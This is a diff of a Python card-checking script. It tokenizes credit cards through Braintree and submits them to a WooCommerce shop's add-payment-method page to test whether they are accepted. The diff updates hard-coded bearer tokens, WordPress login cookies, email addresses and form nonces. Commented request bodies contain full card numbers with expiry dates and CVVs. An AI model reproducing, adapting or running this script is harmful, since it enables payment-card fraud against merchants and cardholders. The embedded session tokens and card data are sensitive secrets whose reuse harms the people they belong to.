@@ -63,11 +63,12 @@ def chk(card):
 
 
 
+
 	headers = {
     'authority': 'payments.braintree-api.com',
     'accept': '*/*',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzAxMTc2OTYsImp0aSI6ImRhNTEyNzU5LWI4ZWItNGU5NS05YjhjLTBlNjU5OTI2ZTFjOSIsInN1YiI6IjM2NHpiN3dweWgzOTJkcXMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjM2NHpiN3dweWgzOTJkcXMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.i3BwxxH1zdi8JZNbNiS7yFvnG3LVzzkBHOCxLygD_Ar4tEloLPW_oSTucjMfCMlD22vc9pU8yMBgPn-Hc8iE1A',
+    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzAxMjUyNTIsImp0aSI6IjYzZWNjOWMzLTdmNjAtNGNkNi05ZmMxLTg3YzE0ZWZjYTFlNCIsInN1YiI6IjM2NHpiN3dweWgzOTJkcXMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjM2NHpiN3dweWgzOTJkcXMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.c5afRyyMo1yINFAJNmxM9-3A3a2I-Q5X1fGpRHb6Obkj1fxetfM2dvbQhUTjKntTz5i6_qPWH-WH1DeZ_d8YXA',
     'braintree-version': '2018-05-10',
     'cache-control': 'no-cache',
     'content-type': 'application/json',
@@ -87,7 +88,7 @@ def chk(card):
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': '36f77f8c-be09-45f7-9928-13c263d263c5',
+        'sessionId': '4490c2b7-db61-4c41-8749-71833375b34a',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
@@ -110,7 +111,7 @@ def chk(card):
 
 # Note: json_data will not be serialized by requests
 # exactly as it was in the original request.
-#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"36f77f8c-be09-45f7-9928-13c263d263c5"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5154781938803663","expirationMonth":"09","expirationYear":"2026","cvv":"364"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
+#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"4490c2b7-db61-4c41-8749-71833375b34a"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5115582514008794","expirationMonth":"11","expirationYear":"2025","cvv":"595"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
 #response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
 
 	tok = response.json()['data']['tokenizeCreditCard']['token']
@@ -126,24 +127,26 @@ def chk(card):
 
 
 
+
+
 	cookies = {
     '_gcl_au': '1.1.1884805934.1729976321',
     '_ga': 'GA1.1.1428833298.1729976322',
     'woocommerce_current_currency': 'GBP',
-    'wordpress_logged_in_ed6aaaf2a4c77ec940184ceefa0c74db': 'y19554708%7C1731186179%7CplYvJKRXVgyIaPSf7vZMA7fblC5BAA5FrEcDpwbk47w%7C5eaa5e9014602d8d4b04804427bbe405c831129eb610747847d7020d14fe7793',
+    'wordpress_logged_in_ed6aaaf2a4c77ec940184ceefa0c74db': 'lewisrae94%7C1731245266%7CF6jd0xAfeUMIW7uPS1fDBGzAOab5ISvuG0KLt4vaVJ2%7Cdf0d395623a5c280f68a5b572b9402d6edb807985e11ed1b1dba2f184d2878f2',
     'mailchimp_user_previous_email': 'moh5527vbnm%40gmail.com',
-    'mailchimp_user_email': 'y19554708%40gmail.com',
+    'mailchimp_user_email': 'moh5527vbnm%40gmail.com',
     'mailchimp_landing_site': 'https%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method',
     'nitroCachedPage': '0',
     'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2024-10-27%2012%3A14%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fpayment-methods',
-    'sbjs_first_add': 'fd%3D2024-10-27%2012%3A14%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fpayment-methods',
+    'sbjs_current_add': 'fd%3D2024-10-27%2014%3A20%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method',
+    'sbjs_first_add': 'fd%3D2024-10-27%2014%3A20%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method',
     'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
     'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method',
-    '_ga_81KZY32HGV': 'GS1.1.1730031295.2.0.1730031295.60.0.0',
-    '_ga_0YYGQ7K779': 'GS1.1.1730031295.2.1.1730031319.0.0.0',
+    '_ga_81KZY32HGV': 'GS1.1.1730038852.4.0.1730038852.60.0.0',
+    '_ga_0YYGQ7K779': 'GS1.1.1730038852.4.0.1730038874.0.0.0',
 }
 
 	headers = {
@@ -152,7 +155,7 @@ def chk(card):
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'no-cache',
     'content-type': 'application/x-www-form-urlencoded',
-    # 'cookie': '_gcl_au=1.1.1884805934.1729976321; _ga=GA1.1.1428833298.1729976322; woocommerce_current_currency=GBP; wordpress_logged_in_ed6aaaf2a4c77ec940184ceefa0c74db=y19554708%7C1731186179%7CplYvJKRXVgyIaPSf7vZMA7fblC5BAA5FrEcDpwbk47w%7C5eaa5e9014602d8d4b04804427bbe405c831129eb610747847d7020d14fe7793; mailchimp_user_previous_email=moh5527vbnm%40gmail.com; mailchimp_user_email=y19554708%40gmail.com; mailchimp_landing_site=https%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method; nitroCachedPage=0; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-27%2012%3A14%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fpayment-methods; sbjs_first_add=fd%3D2024-10-27%2012%3A14%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fpayment-methods; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method; _ga_81KZY32HGV=GS1.1.1730031295.2.0.1730031295.60.0.0; _ga_0YYGQ7K779=GS1.1.1730031295.2.1.1730031319.0.0.0',
+    # 'cookie': '_gcl_au=1.1.1884805934.1729976321; _ga=GA1.1.1428833298.1729976322; woocommerce_current_currency=GBP; wordpress_logged_in_ed6aaaf2a4c77ec940184ceefa0c74db=lewisrae94%7C1731245266%7CF6jd0xAfeUMIW7uPS1fDBGzAOab5ISvuG0KLt4vaVJ2%7Cdf0d395623a5c280f68a5b572b9402d6edb807985e11ed1b1dba2f184d2878f2; mailchimp_user_previous_email=moh5527vbnm%40gmail.com; mailchimp_user_email=moh5527vbnm%40gmail.com; mailchimp_landing_site=https%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method; nitroCachedPage=0; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-27%2014%3A20%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method; sbjs_first_add=fd%3D2024-10-27%2014%3A20%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method; _ga_81KZY32HGV=GS1.1.1730038852.4.0.1730038852.60.0.0; _ga_0YYGQ7K779=GS1.1.1730038852.4.0.1730038874.0.0.0',
     'origin': 'https://www.tea-and-coffee.com',
     'pragma': 'no-cache',
     'referer': 'https://www.tea-and-coffee.com/account/add-payment-method',
@@ -176,7 +179,7 @@ def chk(card):
     'wc_braintree_credit_card_payment_nonce': tok,
     'wc_braintree_device_data': '',
     'wc-braintree-credit-card-tokenize-payment-method': 'true',
-    'woocommerce-add-payment-method-nonce': 'c4c3a3dabf',
+    'woocommerce-add-payment-method-nonce': 'cd8fa39e99',
     '_wp_http_referer': '/account/add-payment-method',
     'woocommerce_add_payment_method': '1',
 }
